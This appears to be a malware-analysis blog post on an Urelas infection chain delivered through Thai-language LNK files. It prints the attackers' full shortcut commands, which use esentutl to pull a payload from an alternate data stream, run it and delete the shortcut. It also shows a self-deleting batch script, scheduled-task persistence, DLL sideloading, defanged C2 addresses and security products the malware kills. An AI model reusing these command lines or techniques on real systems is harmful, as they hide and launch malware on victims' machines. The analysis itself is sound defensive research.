---
layout: default
title:  "Urelas: Leveraging alternate data streams in LNK files"
date:   2025-07-27 15:48:00 -0400
categories: malware analysis
---

One of my favorite things to do when I need to dig back into analysis after a break is to pick a random sample from Abuse Bazaar. I try to avoid obvious, known tags like RedLineStealer and the like, as the temptation when I get stuck is too great to read analysis reports for clues from security researchers infinitely smarter than me.

This time, I chose an LNK file tagged “weripan.” A quick “exact phrase” Google search only yielded 6 results which was good to see. I avoided checking the 2 Joe Sandbox entries to not spoil IOCs or behaviors. Here is my awful flowchart of the infection process.

![Alt text](/assets/images/2025/Urelas/1-flowchart.png)

The LNK that I acquired had a Thai filename: กระทรวงยุติธรรมสหรัฐอเมริกา.pdf.lnk.

I am usually careful using Google Translate when attempting to understand foreign languages as it can be completely inaccurate, but this translation seemed pretty reliable: United States Department of Justice.

The LNK has a PDF icon to coax the victim into opening it. The target path set for the LNK is:

{% highlight ruby %}
/c esentutl.exe /y "%cd%\กระทรวงยุติธรรมสหรัฐอเมริกา.pdf.lnk:file.exf" /d "%cd%\กระทรวงยุติธรรมสหรัฐอเมริกา.pdf" /o & IF EXIST "%cd%\กระทรวงยุติธรรมสหรัฐอเมริกา.pdf" (start "" "%cd%\กระทรวงยุติธรรมสหรัฐอเมริกา.pdf" & del "%cd%\กระทรวงยุติธรรมสหรัฐอเมริกา.pdf.lnk") ELSE msg * "Cannot open files, please extract!"
{% endhighlight %}

This is an incredibly cool usage of LNK attacks that I have not seen before. Instead of the usual CMD.exe > command that is usually PowerShell, it leverages esentutl.exe (https://lolbas-project.github.io/lolbas/Binaries/Esentutl/). Let’s break it down:

>cmd.exe is used with the /c option to run the command and terminate.

> Comand begins with leveraging Esentutl to manipulate an alternate data stream with the /y operation mode to select a source file.

> The source file in the string is a change directory followed by the LNK file: “%cd%\กระทรวงยุติธรรมสหรัฐอเมริกา.pdf.lnk:file.exf”

> The /d operation is used as a destination to write an actual PDF file.

> Afterwards, the following occurs:

> Overwrite the PDF if it exists.

> Check the presence of the PDF.

> Open the PDF.

> Delete the original LNK file.

> If the previous IF EXIST fails, a window prints the message “Cannot open files, please extract!”

Quick static analysis of the LNK provides some interesting IOCs from the track database block that we can use for scoping and the creation of a YARA rule later.

> Machine ID: desktop-0rapj5u

> MAC Address: 04:d4:c4:57:33:0b

> MAC Vendor: ASUS

> Creation: 2024–01–10 23:42:38

There is also mention of “Icon Location:” .\aaa.pdf.

![Alt text](/assets/images/2025/Urelas/2-aaapdf.png)

So far, the flow of this malware is to drop an LNK file with a target of writing/extracting a PDF to the directory per a defined ADS stream. This is where I started to notice some problems.

Initial dynamic analysis shows the error message that is displayed because the IF EXIST check fails.

![Alt text](/assets/images/2025/Urelas/3-msg.png)

At this point, I realized that this is one of those situations where you pull a sample from Abuse or another repository and it’s either not matching the original environment or is a file that requires the previous stage. Typically, recent LNK attack chains are: Phishing email>ZIP Archive>ISO w/ the LNK or just the LNK after extracting the ZIP.

Thus, to find the original stage, I queried the LNK hash on VirusTotal and the result was a single RAR file. Downloading it and extracting it gives us results that look like the TA intended. There are two files present upon extraction, both of which are LNKs.

![Alt text](/assets/images/2025/Urelas/4-lnks.png)

The first LNK file with the fake PDF icon extracts a PDF from the data stream.

![Alt text](/assets/images/2025/Urelas/5-pdfstream.png)

![Alt text](/assets/images/2025/Urelas/6-decoypdf.png)

The second LNK file LNK is a command like we saw in the earlier, incomplete sample.

{% highlight ruby %}
"DeviceCredentialDeployment.exe ||(esentutl.exe /y "%cd%\ด่วนที่สุด ทางการสหรัฐอเมริกาขอความร่วมมือระหว่างประเทศในเรื่องทางอาญา.docx.lnk:file.exf" /d "%cd%\ด่วนที่สุด ทางการสหรัฐอเมริกาขอความร่วมมือระหว่างประเทศในเรื่องทางอาญา.docx" /o & (IF EXIST "%cd%\ด่วนที่สุด ทางการสหรัฐอเมริกาขอความร่วมมือระหว่างประเทศในเรื่องทางอาญา.docx" (start explorer "%cd%\ด่วนที่สุด ทางการสหรัฐอเมริกาขอความร่วมมือระหว่างประเทศในเรื่องทางอาญา.docx"))) & (esentutl.exe /y "%cd%\ด่วนที่สุด ทางการสหรัฐอเมริกาขอความร่วมมือระหว่างประเทศในเรื่องทางอาญา.docx.lnk:file.ext" /d C:\Users\Public\file.exe /o &&(IF EXIST "C:\Users\Public\file.exe" (start C:\Users\Public\file.exe && del "%cd%\ด่วนที่สุด ทางการสหรัฐอเมริกาขอความร่วมมือระหว่างประเทศในเรื่องทางอาญา.docx.lnk" && exit)) || (IF EXIST "C:\Users\Public\file.exe" (start C:\Users\Public\file.exe && del "%cd%\ด่วนที่สุด ทางการสหรัฐอเมริกาขอความร่วมมือระหว่างประเทศในเรื่องทางอาญา.docx.lnk") ELSE (msg * "Cannot open files, please extract!" && exit)))"
{% endhighlight %}

The translation for the .docx is: Urgently, United States authorities ask for international cooperation in criminal matters.

![Alt text](/assets/images/2025/Urelas/7-docx.png)

DeviceCredentialDeployment grabs the executed console window handle and sets it to hidden. The flow, however, is similar to the fake PDF seen earlier in that it uses Esentutl to extract a file (file.exe) from the ADS stream appended to the LNK file and then deletes the LNK.

Shortly after, file.exe creates the directory police in %programdata%, drops an executable named IdrInit.exe, and then creates a DLL called ProductStatistics3.

During these operations, an instance of cmd.exe creates a scheduled task:

![Alt text](/assets/images/2025/Urelas/8-schtask.png)

The task is named MicrosofTSUpdate and will execute IdrInit.exe every 5 minutes.

IdrInit.exe is spawned with “SW_HIDE” and creates the directory iTop Data Recovery\Data in %roaming% and creates iTopDataRecovery.exe and Main.ini in iTop Data Recovery\.

Based on the creation of iTopDataRecovery artifacts, it looks like the TA is using IdrInit.exe to sideload the ProductStatistics3 DLL (https://steamdb.info/depot/2620311/).

Interestingly, IdrInit.exe is signed under the name ORANGE VIEW LIMITED. Moreover, unlike many TAs, there is a countersignature present. This is likely because the legitimate executable is being leveraged for this attack (https://steamdb.info/publisher/Orange+View+Limited/).

![Alt text](/assets/images/2025/Urelas/9-cert.png)

The DLL appears to be responsible for communication with C2.

![Alt text](/assets/images/2025/Urelas/10-dllc2.png)

122[.]155[.]28[.]155 has been identified to communicate with ProductStatistics3.dll.

> Data Comm. Dept. National Telecom Public Company Limited

> NT Tower
> 72 Charoenkrung Road Bangrak Bangkok THAILAND 10501

154[.]90[.]47[.]77 has also communicated ProductStatistics3 and an executable named Studio.exe which is likely the Urelas trojan.

> Autonomous System Label

> Kaopu Cloud HK Limited

> Regional Internet Registry

> APNIC

> Country

> TH

The DLL does a significant amount of environmental checks, especially geographical and language-based to probably limit the campaign to Asia.

Once Studio.exe is on the system and runs, it copies itself to %appdata% TEMP as huter.exe. Following this, a batch script named sanfdr.bat runs which deletes Studio.exe and itself, leaving only huter.exe.

{% highlight ruby %}
:Repeat
del “C:\Users\username\Desktop\Studio.exe”
if exist “C:\Users\username\Desktop\Studio.exe” goto Repeat
rmdir “C:\Users\username\Desktop”
del “C:\Users\username\AppData\Local\Temp\sanfdr.bat”
{% endhighlight %}

Studio.exe is packed with Packman(1.0) — a packer I have never seen used in the wild before.

![Alt text](/assets/images/2025/Urelas/11-packed.png)

Unpacking reveals that it is a variant of the Urelas dropper. This version calls out to 3x IPs: 112[.]175[.]88[.]207, 208, and 209. Of course, Urelas is known for dropping a slew of malware developed for purposes of spyware and, more importantly, infostealing against Asia/South Korean targets.

The malware checks for different Korean security products like AhnLab, ALYac EDR, and NaverAgent, and, if possible, terminates them.

> \Program Files\AhnLab\V3Lite30\V3Lite.exe

> \Program Files\ESTsoft\ALYac\AYLaunch.exe

> \Program Files\naver\NaverAgent\NaverAgent.exe

Some gaming platforms it looks for are Hangame, NEOWIZ, and Netmarble.

> \Hangame\KOREAN\HanUninstall.exe

> \NEOWIZ\PMang\common\PMLauncher.exe

> \Netmarble\Common\NetMarbleEndWeb.exe

That’s it for today! Thanks for reading.